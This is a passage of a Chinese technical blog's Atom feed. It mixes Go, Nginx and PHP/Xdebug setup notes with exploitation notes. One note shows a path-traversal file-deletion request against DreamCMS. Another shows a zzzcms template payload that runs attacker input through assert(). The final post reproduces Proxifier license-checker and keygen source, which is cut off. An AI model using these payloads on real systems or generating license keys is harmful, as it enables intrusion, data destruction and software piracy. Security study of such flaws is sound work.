    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;梦想CMS任意文件读取漏洞利用&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>【笔记】梦想CMS任意文件删除漏洞利用</title>
    <link href="https://loli.fj.cn/2024/07/10/%E6%A2%A6%E6%83%B3CMS%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>https://loli.fj.cn/2024/07/10/%E6%A2%A6%E6%83%B3CMS%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</id>
    <published>2024-07-10T17:54:32.000Z</published>
    <updated>2024-07-12T10:53:28.855Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>梦想CMS任意文件删除漏洞利用<br>CNVD-2020-59469</p><span id="more"></span><h2 id="漏洞利用前提"><a href="#漏洞利用前提" class="headerlink" title="漏洞利用前提"></a>漏洞利用前提</h2><ul><li>可以登录管理员后台</li></ul><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><blockquote><p><code>../../install/install_ok.txt</code>：删除的文件</p></blockquote><div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><figcaption><span>request</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET http://127.0.0.1:80/admin.php?m=backdb&amp;a=delbackdb&amp;filename=../../install/install_ok.txt</span><br></pre></td></tr></table></figure></div><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;梦想CMS任意文件删除漏洞利用&lt;br&gt;CNVD-2020-59469&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>【笔记】zzzcms任意代码执行漏洞利用</title>
    <link href="https://loli.fj.cn/2024/07/10/zzzcms%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>https://loli.fj.cn/2024/07/10/zzzcms%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</id>
    <published>2024-07-10T11:10:51.000Z</published>
    <updated>2024-07-12T10:53:28.835Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>zzzcms任意代码执行漏洞利用<br><a href="/302.html?target=https://cnvd.gov.cn/flaw/show/CNVD-2019-06158">CNVD-2019-06158</a><br><a class="link"   href="https://expolit-db.com/exploits/46454" >https://expolit-db.com/exploits/46454 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><span id="more"></span><h2 id="漏洞利用前提"><a href="#漏洞利用前提" class="headerlink" title="漏洞利用前提"></a>漏洞利用前提</h2><ul><li>已经登录管理员后台</li></ul><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><ol><li><p>在搜索文件末尾追加<code>&#123;if:assert($_REQUEST[&#39;x&#39;])&#125;phpinfo();&#123;end if&#125;</code></p></li><li><p>在搜索时传递参数</p></li></ol><div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><figcaption><span>request</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /search/</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">x=phpinfo()</span><br></pre></td></tr></table></figure></div><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;zzzcms任意代码执行漏洞利用&lt;br&gt;&lt;a href=&quot;/302.html?target=https://cnvd.gov.cn/flaw/show/CNVD-2019-06158&quot;&gt;CNVD-2019-06158&lt;/a&gt;&lt;br&gt;&lt;a class=&quot;link&quot;   href=&quot;https://expolit-db.com/exploits/46454&quot; &gt;https://expolit-db.com/exploits/46454 &lt;i class=&quot;fa-regular fa-arrow-up-right-from-square fa-sm&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>【踩坑】Go语言为Map的Value的属性赋值时报错</title>
    <link href="https://loli.fj.cn/2024/07/09/Go%E8%AF%AD%E8%A8%80%E4%B8%BAMap%E7%9A%84Value%E7%9A%84%E5%B1%9E%E6%80%A7%E8%B5%8B%E5%80%BC%E6%97%B6%E6%8A%A5%E9%94%99/"/>
    <id>https://loli.fj.cn/2024/07/09/Go%E8%AF%AD%E8%A8%80%E4%B8%BAMap%E7%9A%84Value%E7%9A%84%E5%B1%9E%E6%80%A7%E8%B5%8B%E5%80%BC%E6%97%B6%E6%8A%A5%E9%94%99/</id>
    <published>2024-07-09T18:16:56.000Z</published>
    <updated>2024-07-12T10:53:28.763Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Go语言为Map的Value的属性赋值时报错：<code>Cannot assign to &lt;map_name&gt;[&lt;key&gt;].&lt;field&gt;</code></p><span id="more"></span><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><ul><li>因为这个Map的Value是一个对象值而不是对象引用（指针），不能对对象进行赋值</li></ul><h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><ul><li>修改Map的定义，将Value类型改为对象引用</li></ul><div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">Username <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> user User</span><br><span class="line">    <span class="keyword">var</span> m <span class="keyword">map</span>[<span class="type">string</span>]*User</span><br><span class="line">    m[<span class="string">&quot;key&quot;</span>] = &amp;User&#123;Username: <span class="string">&quot;username&quot;</span>&#125;</span><br><span class="line">    m[<span class="string">&quot;key&quot;</span>].username = <span class="string">&quot;username&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="/302.html?target=https://blog.csdn.net/makenothing/article/details/105037977">CSDN——CAPTIAN船长</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Go语言为Map的Value的属性赋值时报错：&lt;code&gt;Cannot assign to &amp;lt;map_name&amp;gt;[&amp;lt;key&amp;gt;].&amp;lt;field&amp;gt;&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="Go" scheme="https://loli.fj.cn/tags/Go/"/>
    
  </entry>
  
  <entry>
    <title>【踩坑】NginxPHP部署完成后访问报错</title>
    <link href="https://loli.fj.cn/2024/07/09/NginxPHP%E9%83%A8%E7%BD%B2%E5%AE%8C%E6%88%90%E5%90%8E%E8%AE%BF%E9%97%AE%E6%8A%A5%E9%94%99/"/>
    <id>https://loli.fj.cn/2024/07/09/NginxPHP%E9%83%A8%E7%BD%B2%E5%AE%8C%E6%88%90%E5%90%8E%E8%AE%BF%E9%97%AE%E6%8A%A5%E9%94%99/</id>
    <published>2024-07-09T16:50:50.000Z</published>
    <updated>2024-07-12T10:53:28.799Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>NginxPHP部署完成后访问报错：<code>File not found.</code></p><span id="more"></span><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><ul><li>文件没找到</li></ul><h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><ul><li>Nginx配置文件的<code>location</code>块中的<code>root</code>字段配置不正确</li></ul><p>root中不能使用<code>~</code>作为当前用户的home目录</p><ul><li>Nginx配置文件的<code>location</code>块中的<code>fastcgi_param</code>字段要将<code>/scripts$fastcgi_script_name</code>改成<code>$document_root$fastcgi_script_name</code></li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><figcaption><span>/opt/homebrew/etc/nginx/nginx.conf</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">location ~ \.php$ &#123;</span><br><span class="line">    root           /opt/homebrew/var/www;</span><br><span class="line">    fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">    fastcgi_index  index.php;</span><br><span class="line">    fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span><br><span class="line">    include        fastcgi_params;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="/302.html?target=https://blog.csdn.net/aoh7115497530534/article/details/101551797">CSDN——aoh7115497530534</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;NginxPHP部署完成后访问报错：&lt;code&gt;File not found.&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="PHP" scheme="https://loli.fj.cn/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>【笔记】IDEA配置PHP开发环境</title>
    <link href="https://loli.fj.cn/2024/07/09/IDEA%E9%85%8D%E7%BD%AEPHP%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/"/>
    <id>https://loli.fj.cn/2024/07/09/IDEA%E9%85%8D%E7%BD%AEPHP%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/</id>
    <published>2024-07-09T16:17:53.000Z</published>
    <updated>2024-07-12T10:53:28.775Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在MacOS上的IDEA配置PHP开发环境<br>本案例以 PHP 8.2.21 为例</p><span id="more"></span><h2 id="下载php"><a href="#下载php" class="headerlink" title="下载php"></a>下载php</h2><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install php@8.2</span><br></pre></td></tr></table></figure></div><h2 id="下载Xdebug"><a href="#下载Xdebug" class="headerlink" title="下载Xdebug"></a>下载Xdebug</h2><h3 id="通过Pecl安装xdebug"><a href="#通过Pecl安装xdebug" class="headerlink" title="通过Pecl安装xdebug"></a>通过Pecl安装xdebug</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pecl install xdebug</span><br></pre></td></tr></table></figure></div><h3 id="直接下载二进制程序"><a href="#直接下载二进制程序" class="headerlink" title="直接下载二进制程序"></a>直接下载二进制程序</h3><ul><li>下载对应平台的二进制程序</li></ul><h4 id="MacOS（Apple-Silicon）"><a href="#MacOS（Apple-Silicon）" class="headerlink" title="MacOS（Apple Silicon）"></a>MacOS（Apple Silicon）</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://xdebug.org/files/binaries/dbgpClient-macos-arm64</span><br></pre></td></tr></table></figure></div><h2 id="下载PHP插件"><a href="#下载PHP插件" class="headerlink" title="下载PHP插件"></a>下载PHP插件</h2><ul><li><code>IntelliJ IDEA</code>-&gt;<code>Preferences</code>-&gt;<code>Plugins</code>-&gt;搜索<code>php</code>-&gt;安装<code>php</code>插件-&gt;<code>OK</code></li></ul><p><img src="/images/20240709161753/01.webp"></p><h2 id="配置PHP环境"><a href="#配置PHP环境" class="headerlink" title="配置PHP环境"></a>配置PHP环境</h2><ul><li><code>IntelliJ IDEA</code>-&gt;<code>Preferences</code>-&gt;<code>Laguages &amp; Frameworks</code>-&gt;<code>PHP</code>-&gt;<code>PHP language level</code>选择对应版本-&gt;<code>CLI Interpreter</code>-&gt;<code>...</code>-&gt;<code>+</code>-&gt;添加PHP环境-&gt;<code>OK</code>-&gt;<code>OK</code></li></ul><p><img src="/images/20240709161753/02.webp"></p><h2 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h2><ul><li>报错：<code>Cannot load Xdebug - it was already loaded</code></li></ul><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><ul><li>因为在启用IDEA的PHP开发环境之前，手动启用了php解析器，而php解析器开启了xdebug，所以导致xdebug通过IDEA再次开启时失败</li></ul><h3 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h3><ul><li>注释PHP配置文件第一行</li></ul><div class="highlight-container" data-rel="Ini"><figure class="iseeu highlight ini"><figcaption><span>/opt/homebrew/etc/php/8.2/php.ini</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">;zend_extension=&quot;xdebug.so&quot;</span></span><br></pre></td></tr></table></figure></div><ul><li>关闭手动启用的php解析器</li></ul><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew services stop php@8.2</span><br></pre></td></tr></table></figure></div><h2 id="断点调试"><a href="#断点调试" class="headerlink" title="断点调试"></a>断点调试</h2><ul><li>选择一行代码标记断点，以Debug方式运行</li></ul><p><img src="/images/20240709161753/03.webp"></p><ul><li>成功卡在断点处</li></ul><p><img src="/images/20240709161753/04.webp"></p><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="/302.html?target=https://xdebug.org/docs/install">xdebug官方文档</a><br><a class="link"   href="https://blog.csdn.net/Mrs_chens/article/details/104677315" >CSDN——陈永佳 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://blog.csdn.net/zhangxiaoyang0/article/details/88754041" >CSDN——每天进步一点_点 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://blog.csdn.net/weixin_51614272/article/details/124412606" >CSDN——Sunlight_614 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在MacOS上的IDEA配置PHP开发环境&lt;br&gt;本案例以 PHP 8.2.21 为例&lt;/p&gt;</summary>
    
    
    
    
    <category term="Jetbrains" scheme="https://loli.fj.cn/tags/Jetbrains/"/>
    
    <category term="MacOS" scheme="https://loli.fj.cn/tags/MacOS/"/>
    
  </entry>
  
  <entry>
    <title>【笔记】ProxifierKeygen学习笔记</title>
    <link href="https://loli.fj.cn/2024/07/09/ProxifierKeygen%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://loli.fj.cn/2024/07/09/ProxifierKeygen%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2024-07-09T15:02:09.000Z</published>
    <updated>2024-07-12T10:53:28.807Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>利用<a href="/302.html?target=https://github.com/y9nhjy/Proxifier-Keygen">y9nhjy&#x2F;Proxifier-Keygen</a>注册Proxifier学习笔记</p><span id="more"></span><h2 id="下载项目"><a href="#下载项目" class="headerlink" title="下载项目"></a>下载项目</h2><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/y9nhjy/Proxifier-Keygen.git</span><br><span class="line">cd Proxifier-Keygen</span><br></pre></td></tr></table></figure></div><h3 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><figcaption><span>Proxifier_Checker.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">本脚本为Proxifier中key的check算法，不是项目主要内容，仅供逆向学习参考</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">s</span>):</span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s) - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        res *= <span class="number">32</span></span><br><span class="line">        t = <span class="built_in">ord</span>(s[i])</span><br><span class="line">        <span class="keyword">if</span> s[i] == <span class="string">&#x27;W&#x27;</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">elif</span> s[i] == <span class="string">&#x27;X&#x27;</span>:</span><br><span class="line">            res += <span class="number">24</span></span><br><span class="line">        <span class="keyword">elif</span> s[i] == <span class="string">&#x27;Y&#x27;</span>:</span><br><span class="line">            res += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> s[i] == <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">            res += <span class="number">18</span></span><br><span class="line">        <span class="keyword">elif</span> s[i] <span class="keyword">in</span> <span class="string">&quot;0123456789&quot;</span>:</span><br><span class="line">            res += t - <span class="number">48</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res += t - <span class="number">55</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CRC32_like</span>(<span class="params">n</span>):</span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">        v2 = ((n &gt;&gt; (<span class="number">8</span> * i)) &amp; <span class="number">0xff</span>) &lt;&lt; <span class="number">24</span></span><br><span class="line">        <span class="keyword">if</span> i:</span><br><span class="line">            res ^= v2</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res = (~v2) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            res *= <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> res &gt;= <span class="number">0xFFFFFFFF</span>:</span><br><span class="line">                res &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line">                res ^= <span class="number">0x4C11DB7</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 替换这里的key为想要验证的key</span></span><br><span class="line">key = <span class="string">&#x27;QSC6X-CWAAK-4D62C-OAXDD-S9GE1&#x27;</span></span><br><span class="line">key = key.replace(<span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">key = key[:<span class="number">2</span>] + key[<span class="number">14</span>] + key[<span class="number">3</span>:]</span><br><span class="line"><span class="comment"># 末尾5位</span></span><br><span class="line">v17 = handle(key[<span class="number">20</span>:<span class="number">25</span>])</span><br><span class="line">v18 = v17 ^ (v17 &lt;&lt; <span class="number">7</span>)</span><br><span class="line"><span class="comment"># 开头7位</span></span><br><span class="line">v23 = handle(key[:<span class="number">7</span>])</span><br><span class="line"><span class="comment"># 开头8~14位</span></span><br><span class="line">v27 = handle(key[<span class="number">7</span>:<span class="number">7</span> + <span class="number">7</span>])</span><br><span class="line">low_4B = v18 ^ v23 ^ <span class="number">0x12345678</span></span><br><span class="line">mid_4B = v18 ^ v27 ^ <span class="number">0x87654321</span></span><br><span class="line">high_4B = handle(key[<span class="number">15</span>:<span class="number">20</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;v17       :&quot;</span> + <span class="built_in">hex</span>(v17))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;v18       :&quot;</span> + <span class="built_in">hex</span>(v18))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;low_4B    :&quot;</span> + <span class="built_in">hex</span>(low_4B))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;mid_4B    :&quot;</span> + <span class="built_in">hex</span>(mid_4B))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;high_4B   :&quot;</span> + <span class="built_in">hex</span>(high_4B))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>((high_4B &lt;&lt; <span class="number">64</span>) + (mid_4B &lt;&lt; <span class="number">32</span>) + low_4B))</span><br><span class="line"></span><br><span class="line">res = CRC32_like((high_4B &lt;&lt; <span class="number">64</span>) + (mid_4B &lt;&lt; <span class="number">32</span>) + low_4B)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(res))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(res &amp; <span class="number">0x1FFFFFF</span>))</span><br><span class="line"><span class="keyword">assert</span> v17 == (res &amp; <span class="number">0x1FFFFFF</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;验证成功&quot;</span>)</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><figcaption><span>Proxifier_Keygen.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_parser</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(usage=<span class="string">&#x27;python3 Proxifier_Keygen.py [-v setup/portable/mac]&#x27;</span>,</span><br><span class="line">        description=<span class="string">&#x27;Proxifier_Keygen: 基于python3的Proxifier注册机, 默认key为setup版本&#x27;</span>,</span><br><span class="line">                                     )</span><br><span class="line">    p = parser.add_argument_group(<span class="string">&#x27;Proxifier_Keygen的参数&#x27;</span>)</span><br><span class="line">    p.add_argument(<span class="string">&quot;-v&quot;</span>, <span class="string">&quot;--version&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Proxifier的版本:setup/portable/mac&quot;</span>)</span><br><span class="line">    <span class="comment"># p.add_argument(&quot;-c&quot;, &quot;--custom&quot;, type=str, help=&quot;自定义Key的第四组字符&quot;)</span></span><br><span class="line">    <span class="comment"># p.add_argument(&quot;-t&quot;, &quot;--table&quot;, type=str, help=&quot;自定义Key的生成字符表&quot;)</span></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">return</span> args</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">s</span>):</span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s) - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        res &lt;&lt;= <span class="number">5</span></span><br><span class="line">        t = <span class="built_in">ord</span>(s[i])</span><br><span class="line">        <span class="keyword">if</span> s[i] == <span class="string">&#x27;W&#x27;</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span 